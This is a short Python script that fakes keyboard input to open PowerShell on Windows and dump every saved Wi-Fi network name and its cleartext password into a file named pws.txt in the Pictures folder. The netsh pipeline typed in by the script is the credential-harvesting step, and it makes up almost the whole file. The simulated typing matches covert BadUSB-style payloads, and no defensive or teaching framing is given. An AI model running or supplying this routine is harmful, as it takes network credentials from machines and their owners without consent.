from keyboard import press_and_release, write
from os import getcwd
from time import sleep
from getpass import getuser

get_usernam = getuser()
get_current_dir = getcwd()

# Open Run command
press_and_release("win")
sleep(0.5)

write("pw")
sleep(0.2)

press_and_release("enter")
sleep(1)

write("cd Pictures")
press_and_release("enter")
sleep(0.5)

write("echo > pws.txt")
sleep(0.5)
press_and_release("enter")
press_and_release("enter")
sleep(0.5)

write("""netsh wlan show profile | 
    Select-String '(?<=All User Profile\\s+:\\s).+' | 
    ForEach-Object {
        $wlan = $_.Matches.Value
        $passw = netsh wlan show profile $wlan key=clear |
            Select-String '(?<=Key Content\\s+:\\s).+'

        [pscustomobject]@{
            Name     = $wlan
            Password = $passw.Matches.Value
        }
    } > pws.txt""")
sleep(1)

press_and_release("enter")
sleep(0.7)

press_and_release("win+up")
sleep(0.5)

# Here I want to save the output into pws.txt
